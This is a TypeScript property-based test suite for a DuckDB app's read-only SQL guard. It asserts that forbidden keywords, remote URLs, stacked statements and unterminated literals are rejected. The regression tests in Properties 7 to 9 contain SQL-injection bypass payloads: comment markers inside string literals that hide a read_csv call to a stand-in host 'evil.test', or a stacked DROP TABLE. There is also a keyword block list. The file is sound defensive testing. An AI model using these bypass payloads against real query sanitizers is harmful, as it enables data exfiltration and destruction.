/**
 * SQL-guard trust-boundary test suite (submission-hardening, Requirements 4.1–4.9).
 *
 * These tests pin the ACTUAL behavior of the three exported guards in
 * `../duckdb` — `assertSelectOnly`, `assertExpression`, `assertIdentifier`.
 * They are imported directly (the module's `?url` asset imports resolve to
 * harmless URL strings under Vitest's Vite-based resolution; no Worker/wasm is
 * instantiated because `createDb()` is never called).
 *
 * The guards throw on rejection and return the trimmed SQL/identifier on
 * acceptance. Tests assert observable behavior verified from the source, and
 * where a message is asserted it is a substring confirmed to exist in
 * `duckdb.ts`. Error message text is NOT invented.
 *
 * Behavior discrepancies vs. the design's property text (verified in source,
 * tests follow the CODE):
 *   - Property 2 (networkish in a COMMENT): the guard blanks comments before
 *     the NETWORKISH test, so a networkish scheme that appears only inside a
 *     comment is not rejected on the networkish rule — and it is inert to
 *     DuckDB, which discards comments in its own lexer. Networkish inside a
 *     STRING LITERAL is still rejected (literals survive into the copy the URL
 *     rule reads). Tests below encode this real behavior and the comment-only
 *     case is asserted to be accepted (when otherwise safe).
 *
 * Properties 7–10 are the regression suite for the literal-vs-comment ordering
 * defect: the guard used to run `stripComments` and `neutralizeStrings` as two
 * independent regex passes, so a comment marker inside a string literal deleted
 * live SQL from the scan copy while the original reached `conn.query()` intact.
 * A single-pass lexer (`scanCopies` in `../duckdb`) replaced both passes.
 */
import { describe, it, expect } from "vitest";
import fc from "fast-check";
import {
  assertSelectOnly,
  assertExpression,
  assertIdentifier,
} from "../duckdb";

const RUNS = { numRuns: 100 } as const;

// The exact keyword set the task enumerates for Property 1 example rows. Each is
// a real token in the guard's FORBIDDEN_TOKENS alternation.
const FORBIDDEN_KEYWORDS = [
  "insert",
  "update",
  "delete",
  "drop",
  "create",
  "alter",
  "attach",
  "detach",
  "copy",
  "truncate",
  "replace",
  "pragma",
  "set",
  "call",
  "install",
  "load",
  "read_csv",
  "read_parquet",
  "parquet_scan",
  "glob",
] as const;

// Allowed leading tokens for assertSelectOnly (Property 4 accept rows).
const ALLOWED_LEADING = [
  "select",
  "with",
  "values",
  "explain",
  "table",
  "from",
  "pivot",
  "unpivot",
] as const;

// Networkish schemes (Property 2). Matches the NETWORKISH regex in duckdb.ts.
const NETWORK_SCHEMES = ["http://", "https://", "s3://", "file://"] as const;

// ---------------------------------------------------------------------------
// Property 1 (R4.1, R4.6): forbidden tokens outside literals/comments → reject
// ---------------------------------------------------------------------------
describe("Property 1 — forbidden tokens outside literals/comments are rejected", () => {
  // Feature: submission-hardening, Property 1: a Forbidden_Token as a real
  // token (outside literals/comments) makes assertSelectOnly AND
  // assertExpression throw.
  it("rejects a forbidden token used as a real token (property)", () => {
    fc.assert(
      fc.property(
        fc.constantFrom(...FORBIDDEN_KEYWORDS),
        // A benign SELECT scaffold so the ONLY offending element is the keyword.
        fc.constantFrom("SELECT 1 ", "SELECT * FROM t ", "SELECT a "),
        (kw, prefix) => {
          const fragment = `${prefix}${kw} x`;
          expect(() => assertSelectOnly(fragment)).toThrow();
          expect(() => assertExpression(fragment)).toThrow();
        }
      ),
      RUNS
    );
  });

  // Feature: submission-hardening, Property 1: matching is case-insensitive.
  it("rejects forbidden tokens regardless of case (property)", () => {
    fc.assert(
      fc.property(
        fc.constantFrom(...FORBIDDEN_KEYWORDS),
        fc.boolean(),
        (kw, upper) => {
          const token = upper ? kw.toUpperCase() : kw;
          const fragment = `SELECT 1 ${token} y`;
          expect(() => assertExpression(fragment)).toThrow();
        }
      ),
      RUNS
    );
  });

  // Table-driven example rows: one per enumerated keyword.
  it.each(FORBIDDEN_KEYWORDS)(
    "rejects the forbidden keyword %s in both guards",
    (kw) => {
      const fragment = `SELECT 1 WHERE ${kw} col`;
      expect(() => assertSelectOnly(fragment)).toThrow(/isn't allowed/);
      expect(() => assertExpression(fragment)).toThrow(/isn't allowed/);
    }
  );
});

// ---------------------------------------------------------------------------
// Property 2 (R4.2, R4.6): networkish references → reject, incl. inside literal
// ---------------------------------------------------------------------------
describe("Property 2 — networkish references are rejected (bare and inside literals)", () => {
  // Feature: submission-hardening, Property 2: a Networkish_Reference in bare
  // SQL or inside a string literal makes both guards throw the remote-URL error.
  it("rejects networkish references in bare SQL and inside string literals (property)", () => {
    fc.assert(
      fc.property(
        fc.constantFrom(...NETWORK_SCHEMES),
        fc.constantFrom("bare", "single-literal", "double-literal"),
        (scheme, placement) => {
          const url = `${scheme}evil.example/data.csv`;
          let fragment: string;
          if (placement === "bare") {
            // Bare URL after FROM (a replacement-scan shape).
            fragment = `SELECT * FROM ${url}`;
          } else if (placement === "single-literal") {
            fragment = `SELECT * FROM t WHERE u = '${url}'`;
          } else {
            fragment = `SELECT * FROM t WHERE u = "${url}"`;
          }
          expect(() => assertSelectOnly(fragment)).toThrow(/Remote URLs/);
          expect(() => assertExpression(fragment)).toThrow(/Remote URLs/);
        }
      ),
      RUNS
    );
  });

  it.each(NETWORK_SCHEMES)(
    "rejects the %s scheme inside a string literal",
    (scheme) => {
      const fragment = `SELECT * FROM t WHERE note = '${scheme}host/x'`;
      expect(() => assertSelectOnly(fragment)).toThrow(/Remote URLs/);
      expect(() => assertExpression(fragment)).toThrow(/Remote URLs/);
    }
  );

  // DISCREPANCY (documented): networkish inside a COMMENT is stripped before the
  // networkish test, so it is NOT rejected on the networkish rule. When the rest
  // of the fragment is a safe read query, it is accepted. This encodes the real
  // code behavior, contrary to the property text that says comments should also
  // trigger rejection.
  it("does NOT reject a networkish scheme that appears only inside a comment (documented discrepancy)", () => {
    const fragment = "SELECT 1 -- see https://example.com/notes";
    expect(assertSelectOnly(fragment)).toBe(fragment);
    // Block comment form.
    const block = "SELECT 1 /* https://example.com */";
    expect(assertSelectOnly(block)).toBe(block);
  });
});

// ---------------------------------------------------------------------------
// Property 3 (R4.3, R4.6): stacked statements → reject; ; in literal → allowed
// ---------------------------------------------------------------------------
describe("Property 3 — stacked statements are rejected", () => {
  // Feature: submission-hardening, Property 3: a top-level semicolon separating
  // two statements makes both guards throw the multiple-statements error.
  it("rejects two statements joined by a top-level semicolon (property)", () => {
    fc.assert(
      fc.property(
        fc.constantFrom("SELECT 1", "SELECT * FROM t", "SELECT a, b FROM t"),
        fc.constantFrom("SELECT 2", "SELECT c FROM u", "VALUES (1)"),
        (first, second) => {
          const fragment = `${first}; ${second}`;
          expect(() => assertSelectOnly(fragment)).toThrow(
            /Multiple statements/
          );
          expect(() => assertExpression(fragment)).toThrow(
            /Multiple statements/
          );
        }
      ),
      RUNS
    );
  });

  // Control (feeds Property 5): a semicolon INSIDE a string literal is NOT a
  // statement separator — the multi-statement rule must not fire.
  it("does not treat a semicolon inside a string literal as a statement separator (property)", () => {
    fc.assert(
      fc.property(
        // A tail built only from safe chars (letters, digits, spaces, extra
        // semicolons) — deterministic, and free of quotes / comment markers /
        // URL schemes that would trip a *different* guard rule.
        fc.array(fc.constantFrom(..."abcXYZ 0123;,._".split("")), {
          maxLength: 8,
        }),
        (chars) => {
          const safeTail = chars.join("");
          const fragment = `SELECT * FROM t WHERE note = 'a; b ${safeTail}'`;
          // Must NOT throw the multiple-statements error (the ';' is in a literal).
          expect(() => assertSelectOnly(fragment)).not.toThrow(
            /Multiple statements/
          );
        }
      ),
      RUNS
    );
  });

  it("rejects a stacked statement even when the first is otherwise valid (example)", () => {
    expect(() => assertSelectOnly("SELECT 1; SELECT 2")).toThrow(
      /Multiple statements/
    );
  });
});

// ---------------------------------------------------------------------------
// Property 4 (R4.4): assertSelectOnly rejects any non-read leading token
// ---------------------------------------------------------------------------
describe("Property 4 — assertSelectOnly rejects non-read leading tokens", () => {
  // Feature: submission-hardening, Property 4: a fragment whose leading token is
  // not an allowed read keyword makes assertSelectOnly throw the
  // only-read-queries error.
  it("rejects fragments led by a non-read identifier token (property)", () => {
    fc.assert(
      fc.property(
        // Bare identifier-like leading tokens that are neither allowed leading
        // keywords nor forbidden tokens (so the ONLY reason to reject is the
        // leading-token rule).
        fc.constantFrom("show", "describe", "list", "foo", "bar", "col", "x1"),
        (lead) => {
          const fragment = `${lead} something`;
          expect(() => assertSelectOnly(fragment)).toThrow(
            /Only read queries/
          );
        }
      ),
      RUNS
    );
  });

  // Table-driven: each allowed leading keyword is accepted by assertSelectOnly.
  it.each(ALLOWED_LEADING)(
    "accepts a fragment led by the allowed keyword %s",
    (lead) => {
      const fragment = `${lead} 1`;
      // Should not throw; returns the trimmed input.
      expect(assertSelectOnly(fragment)).toBe(fragment);
    }
  );
});

// ---------------------------------------------------------------------------
// Property 5 (R4.5, R4.9): safe queries accepted + trimmed; empty → throw
// ---------------------------------------------------------------------------
describe("Property 5 — safe fragments accepted and returned trimmed; empty rejected", () => {
  // Feature: submission-hardening, Property 5: a forbidden-looking substring or
  // a semicolon that appears only inside a string literal is accepted, and the
  // return equals the input trimmed of surrounding whitespace and one trailing ';'.
  it("accepts safe queries with forbidden-looking content only inside a literal, returning trimmed (property)", () => {
    fc.assert(
      fc.property(
        // Explicit whitespace padding (deterministic — no arbitrary strings).
        fc.constantFrom("", " ", "  ", "\t", "\n", " \n ", "\t "),
        fc.constantFrom("", " ", "  ", "\t", "\n", " \n ", "\t "),
        fc.boolean(),
        (lead, trail, trailingSemi) => {
          // A safe read query where 'drop' / ';' live only inside a literal.
          const core = "SELECT * FROM t WHERE note = 'please drop; the mic'";
          const raw = `${lead}${core}${trailingSemi ? ";" : ""}${trail}`;
          const expected = core; // trimmed of surrounding ws and single trailing ;
          expect(assertSelectOnly(raw)).toBe(expected);
        }
      ),
      RUNS
    );
  });

  // Feature: submission-hardening, Property 5: a valid column name that merely
  // contains a forbidden substring (e.g. `update_ts`) does not false-trip.
  it("accepts a valid column identifier containing a forbidden-looking substring (property)", () => {
    fc.assert(
      fc.property(
        fc.constantFrom(
          "update_ts",
          "created_at",
          "dropped_flag",
          "insert_count",
          "loaded_rows"
        ),
        (col) => {
          const fragment = `SELECT ${col} FROM t`;
          expect(assertSelectOnly(fragment)).toBe(fragment);
          expect(assertExpression(`${col} > 0`)).toBe(`${col} > 0`);
        }
      ),
      RUNS
    );
  });

  it("trims surrounding whitespace and a single trailing semicolon (examples)", () => {
    expect(assertSelectOnly("   SELECT 1   ")).toBe("SELECT 1");
    expect(assertSelectOnly("SELECT 1;")).toBe("SELECT 1");
    // NOTE (real behavior): the guard trims outer whitespace first, then strips
    // `;\s*$`. It removes the trailing ';' and any whitespace AFTER it, but not
    // the space that sat BEFORE the ';'. So "  SELECT 1 ;  " → "SELECT 1 "
    // (a single trailing space remains). Tests follow the code.
    expect(assertSelectOnly("  SELECT 1 ;  ")).toBe("SELECT 1 ");
    expect(assertSelectOnly("SELECT 1  ;")).toBe("SELECT 1  ");
    expect(assertExpression("  a = 1  ")).toBe("a = 1");
  });

  // Feature: submission-hardening, Property 5 (empty edge): empty / whitespace /
  // only-trailing-semicolon inputs throw the empty-SQL error.
  it("rejects empty, whitespace-only, and semicolon-only inputs (property)", () => {
    fc.assert(
      fc.property(
        fc.constantFrom("", " ", "  ", "\t", "\n", " \n\t "),
        fc.boolean(),
        (ws, withSemi) => {
          const input = withSemi ? `${ws};${ws}` : ws;
          expect(() => assertSelectOnly(input)).toThrow(/Empty SQL/);
          expect(() => assertExpression(input)).toThrow(/Empty SQL/);
        }
      ),
      RUNS
    );
  });

  it.each(["", "   ", ";", "  ;  "])(
    "throws Empty SQL for %j",
    (input) => {
      expect(() => assertSelectOnly(input)).toThrow(/Empty SQL/);
      expect(() => assertExpression(input)).toThrow(/Empty SQL/);
    }
  );
});

// ---------------------------------------------------------------------------
// Property 6 (R4.6, R4.7, R4.8, R4.9): assertIdentifier ⇔ bare-identifier lang
// ---------------------------------------------------------------------------
describe("Property 6 — assertIdentifier accepts exactly the bare-identifier language", () => {
  // Feature: submission-hardening, Property 6: assertIdentifier returns the
  // trimmed value iff the trimmed value matches ^[A-Za-z_][A-Za-z0-9_]*$,
  // otherwise it throws.
  //
  // Deterministic by construction: rather than feed arbitrary `fc.string()` and
  // mirror the guard's regex as an oracle (which risks whitespace/Unicode edge
  // cases where the two regexes subtly disagree — flaky for a trust test), we
  // generate explicitly-valid and explicitly-invalid identifiers and assert the
  // branch each one must take.
  it("accepts valid identifiers and rejects invalid ones (property)", () => {
    const identChar = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_";
    const headChar = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_";

    // A guaranteed-valid bare identifier: a head char + any tail of ident chars.
    const validIdent = fc
      .tuple(
        fc.constantFrom(...headChar.split("")),
        fc.array(fc.constantFrom(...identChar.split("")), { maxLength: 15 })
      )
      .map(([h, tail]) => h + tail.join(""));

    // A guaranteed-invalid value: inject a char the grammar forbids, or lead
    // with a digit, or make it empty — every branch the guard must reject.
    const invalidIdent = fc.oneof(
      // leading digit
      fc.tuple(
        fc.constantFrom(..."0123456789".split("")),
        fc.array(fc.constantFrom(...identChar.split("")), { maxLength: 8 })
      ).map(([d, tail]) => d + tail.join("")),
      // contains a forbidden char (punctuation, quote, symbol) in the MIDDLE,
      // so trimming can't rescue it. Whitespace is excluded here because the
      // guard trims leading/trailing space first (a trailing-space name like
      // "a " is valid) — embedded-whitespace rejection is covered by the
      // example rows below.
      fc.tuple(
        fc.constantFrom(...headChar.split("")),
        fc.constantFrom(..."-.;'\"()[]{}!@#$%/\\,:".split("")),
        fc.constantFrom(...identChar.split(""))
      ).map(([h, bad, t]) => h + bad + t),
      // empty / whitespace-only
      fc.constantFrom("", " ", "   ", "\t")
    );

    fc.assert(
      fc.property(
        validIdent,
        fc.constantFrom("", " ", "  ", "\t "),
        fc.constantFrom("", " ", "  ", " \t"),
        (ident, lead, trail) => {
          // Valid identifier, optionally padded → accepted, returned trimmed.
          expect(assertIdentifier(`${lead}${ident}${trail}`)).toBe(ident);
        }
      ),
      RUNS
    );

    fc.assert(
      fc.property(invalidIdent, (bad) => {
        expect(() => assertIdentifier(bad)).toThrow(/not a valid column name/);
      }),
      RUNS
    );
  });

  // Feature: submission-hardening, Property 6: valid identifiers are always
  // accepted and returned trimmed.
  it("always accepts generated valid identifiers, returning them trimmed (property)", () => {
    const validIdent = fc
      .tuple(
        fc.constantFrom(..."abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_".split("")),
        fc.array(
          fc.constantFrom(
            ..."abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_".split("")
          ),
          { maxLength: 12 }
        )
      )
      .map(([head, tail]) => head + tail.join(""));
    fc.assert(
      fc.property(
        validIdent,
        fc.constantFrom("", " ", "  ", "\t"),
        fc.constantFrom("", " ", "  ", "\t"),
        (ident, lead, trail) => {
          expect(assertIdentifier(`${lead}${ident}${trail}`)).toBe(ident);
        }
      ),
      RUNS
    );
  });

  it.each([
    ["1col", "leading digit"],
    ["a b", "embedded whitespace"],
    ['"col"', "double quotes"],
    ["'col'", "single quotes"],
    ["col-name", "hyphen punctuation"],
    ["col.name", "dot punctuation"],
    ["col;", "semicolon"],
    ["", "empty"],
    ["   ", "whitespace only"],
    ["9", "bare digit"],
  ])("rejects %j (%s)", (bad) => {
    expect(() => assertIdentifier(bad)).toThrow(/not a valid column name/);
  });

  it.each(["col", "_private", "a1", "snake_case_name", "X", "_", "col_2b"])(
    "accepts valid identifier %j and returns it trimmed",
    (good) => {
      expect(assertIdentifier(`  ${good}  `)).toBe(good);
    }
  );
});

// ---------------------------------------------------------------------------
// Property 7 (regression): a comment marker INSIDE a literal must not delete
// live SQL from the scan copy.
//
// The pre-lexer guard ran `stripComments` and `neutralizeStrings` as two
// independent regex passes, comments first. A `--` or `/*` sitting inside a
// string literal therefore truncated the *scan copy* while the original
// fragment — carrying an exfiltrating `read_csv('http://…')` or a stacked
// `; DROP TABLE` — went to `conn.query()` intact. Every payload below was
// ACCEPTED by that guard. They are the reason `scanCopies` exists.
// ---------------------------------------------------------------------------
describe("Property 7 — literal-borne comment markers cannot hide SQL from the scan", () => {
  const EXFIL = "(SELECT 1 FROM read_csv('http://evil.test/x.csv'))";

  // Every literal form the lexer tracks.
  const WRAPPERS: ((m: string) => string)[] = [
    (m) => `'${m}'`,
    (m) => `"${m}"`,
    (m) => `$$${m}$$`,
    (m) => `$tag$${m}$tag$`,
  ];

  // What the marker is used to hide, and the rule that must catch it anyway.
  const HIDDEN_TAILS: [string, RegExp][] = [
    [`AND x = ${EXFIL}`, /Remote URLs/],
    ["AND x = (SELECT 1 FROM read_parquet('local.parquet'))", /isn't allowed/],
    ["; DROP TABLE dataset", /Multiple statements/],
  ];

  // The three payloads confirmed accepted by the pre-lexer guard.
  it("rejects payload A — `--` inside a single-quoted string hiding a read_csv exfiltration", () => {
    const a = `SELECT * FROM dataset WHERE note = 'a--' AND x = ${EXFIL}`;
    expect(() => assertSelectOnly(a)).toThrow(/Remote URLs/);
    expect(() => assertExpression(a)).toThrow(/Remote URLs/);
  });

  it("rejects payload B — `/*` and `*/` in separate strings straddling a read_csv exfiltration", () => {
    const b = `SELECT * FROM dataset WHERE a = '/*' AND b = ${EXFIL} AND c = '*/'`;
    expect(() => assertSelectOnly(b)).toThrow(/Remote URLs/);
    expect(() => assertExpression(b)).toThrow(/Remote URLs/);
  });

  it("rejects payload C — `--` inside a string hiding a stacked DROP", () => {
    const c = "SELECT 1 WHERE 'x--' = 'x--' ; DROP TABLE dataset";
    expect(() => assertSelectOnly(c)).toThrow(/Multiple statements/);
    expect(() => assertExpression(c)).toThrow(/Multiple statements/);
  });

  // Every literal form the lexer knows about, crossed with every comment
  // marker, crossed with both attack classes. Deterministic: all generators are
  // `constantFrom` over fixed alternatives.
  it("rejects a hidden payload behind a marker in ANY literal form (property)", () => {
    fc.assert(
      fc.property(
        // How the marker is wrapped: single-quoted string, double-quoted
        // identifier, `$$`-quoted, `$tag$`-quoted.
        fc.constantFrom(...WRAPPERS),
        fc.constantFrom("--", "/*", "*/"),
        // The two attack classes: worker-side network reach, and mutation.
        fc.constantFrom(...HIDDEN_TAILS),
        (wrap, marker, [tail, expected]) => {
          const fragment = `SELECT * FROM dataset WHERE note = ${wrap(
            marker
          )} ${tail}`;
          expect(() => assertSelectOnly(fragment)).toThrow(expected);
          expect(() => assertExpression(fragment)).toThrow(expected);
        }
      ),
      RUNS
    );
  });

  it("rejects a marker inside a double-quoted identifier hiding an exfiltration (example)", () => {
    const sql = `SELECT * FROM dataset WHERE "a--" = 1 AND x = ${EXFIL}`;
    expect(() => assertSelectOnly(sql)).toThrow(/Remote URLs/);
  });

  it("rejects a `;` hidden behind a string-borne `--` (example)", () => {
    const sql = "SELECT * FROM t WHERE a = 'x--' AND b = 1; DROP TABLE t";
    expect(() => assertSelectOnly(sql)).toThrow(/Multiple statements/);
  });

  // The control case: the same exfiltration with no literal trickery was ALWAYS
  // rejected — which is exactly why the bypass survived review for so long.
  it("still rejects the bare control payload", () => {
    expect(() =>
      assertSelectOnly("SELECT * FROM read_csv('http://evil.test/x.csv')")
    ).toThrow(/Remote URLs/);
  });
});

// ---------------------------------------------------------------------------
// Property 8: unterminated constructs fail closed.
//
// A fragment the lexer cannot finish reading is refused rather than scanned
// half-blind: we cannot know what DuckDB would make of it, so we do not guess.
// (The pre-lexer guard accepted all of these.)
// ---------------------------------------------------------------------------
describe("Property 8 — unterminated strings and comments fail closed", () => {
  it.each([
    ["SELECT 1 WHERE note = 'oops", "string literal"],
    ['SELECT 1 WHERE "oops', "quoted identifier"],
    ["SELECT 1 WHERE a = $$oops", "dollar-quoted string"],
    ["SELECT 1 WHERE a = $tag$oops", "dollar-quoted string"],
    ["SELECT 1 /* never closed", "block comment"],
    ["SELECT 1 /* outer /* inner */ never closed", "block comment"],
  ])("refuses %j (unterminated %s)", (fragment) => {
    expect(() => assertSelectOnly(fragment)).toThrow(/Unterminated/);
    expect(() => assertExpression(fragment)).toThrow(/Unterminated/);
  });

  it("refuses an unterminated literal whatever follows it (property)", () => {
    fc.assert(
      fc.property(
        fc.constantFrom("'", '"', "$$", "$tag$"),
        fc.constantFrom("", " AND b = 1", " FROM t", " ORDER BY a"),
        (opener, tail) => {
          expect(() =>
            assertExpression(`SELECT 1 WHERE a = ${opener}unclosed${tail}`)
          ).toThrow(/Unterminated/);
        }
      ),
      RUNS
    );
  });
});

// ---------------------------------------------------------------------------
// Property 9: block comments nest, and a comment separates tokens.
//
// Both behaviours were verified against the @duckdb/duckdb-wasm build this app
// ships (duckdb-eh.wasm, node-blocking target):
//   - `SELECT 1 AS a /* x /* y */ , 999 AS boom */` returns ONE column, so the
//     inner `*/` does not end the comment — DuckDB nests.
//   - `SELECT 1 AS dro/*x*/p` is a parser error at "p", so a comment is a token
//     separator, never a token join. The lexer emits a space for that reason.
// ---------------------------------------------------------------------------
describe("Property 9 — nested block comments and comment-as-separator match DuckDB", () => {
  it("treats a nested block comment as one comment, so its contents are inert", () => {
    // Everything from the first `/*` to the LAST `*/` is comment to DuckDB, so
    // the read_csv inside it never runs and nothing leaves the browser.
    const sql =
      "SELECT 1 /* outer /* inner */ AND x = read_csv('http://evil.test/x.csv') */";
    expect(assertSelectOnly(sql)).toBe(sql);
  });

  it("rejects a payload that a nested comment fails to cover", () => {
    // The nesting does not balance — the fragment ends inside a comment.
    expect(() =>
      assertSelectOnly(
        "SELECT 1 /* a /* b */ , read_csv('http://evil.test/x.csv') /* c */"
      )
    ).toThrow(/Unterminated/);
    // Two plain comments with the payload live between them: still caught.
    expect(() =>
      assertSelectOnly(
        "SELECT 1 /* a */ , read_csv('http://evil.test/x.csv') /* b */"
      )
    ).toThrow(/Remote URLs/);
  });

  it("does not fuse the tokens either side of a comment", () => {
    // `dro/*x*/p` is `dro p` to DuckDB (a parser error there), not `drop`. The
    // guard must not invent a `DROP` keyword that DuckDB would never see.
    expect(assertExpression("dro/*x*/p")).toBe("dro/*x*/p");
    // A real DROP is of course still refused.
    expect(() => assertExpression("drop table t")).toThrow(/isn't allowed/);
  });
});

// ---------------------------------------------------------------------------
// Property 10: legitimate values containing comment/statement punctuation are
// still accepted — the fix must not cost the analyst ordinary filters.
// ---------------------------------------------------------------------------
describe("Property 10 — literal values containing markers are still accepted", () => {
  it.each([
    "SELECT * FROM dataset WHERE note = 'a--b'",
    "SELECT * FROM dataset WHERE note = '/* not a comment */'",
    "SELECT * FROM dataset WHERE note = 'a; b'",
    "SELECT * FROM dataset WHERE note = 'x*/y'",
    "SELECT * FROM dataset WHERE note = 'it''s -- fine'",
    "SELECT * FROM dataset WHERE note = 'please drop; the mic'",
    'SELECT "a--b" FROM dataset',
    "SELECT $$a--b$$ AS v FROM dataset",
    "SELECT $tag$a;b$tag$ AS v FROM dataset",
  ])("accepts %j unchanged", (sql) => {
    expect(assertSelectOnly(sql)).toBe(sql);
  });

  it("accepts a marker-bearing value whatever the surrounding clause (property)", () => {
    fc.assert(
      fc.property(
        fc.constantFrom("--", "/*", "*/", ";", "-- /*", "*/ ;"),
        fc.constantFrom(
          "SELECT * FROM dataset WHERE note = ",
          "SELECT a, b FROM dataset WHERE label <> ",
          "SELECT count(a) FROM dataset WHERE tag = "
        ),
        (marker, prefix) => {
          const sql = `${prefix}'value ${marker} more'`;
          expect(assertSelectOnly(sql)).toBe(sql);
        }
      ),
      RUNS
    );
  });

  // A literal URL is STILL rejected, by design — keeping data local is the
  // point. The comment/string handling is what changed, not this verdict.
  it("still rejects a URL-shaped value inside a string (unchanged by the fix)", () => {
    expect(() =>
      assertSelectOnly("SELECT * FROM dataset WHERE note = 'see http://x -- fine'")
    ).toThrow(/Remote URLs/);
  });
});
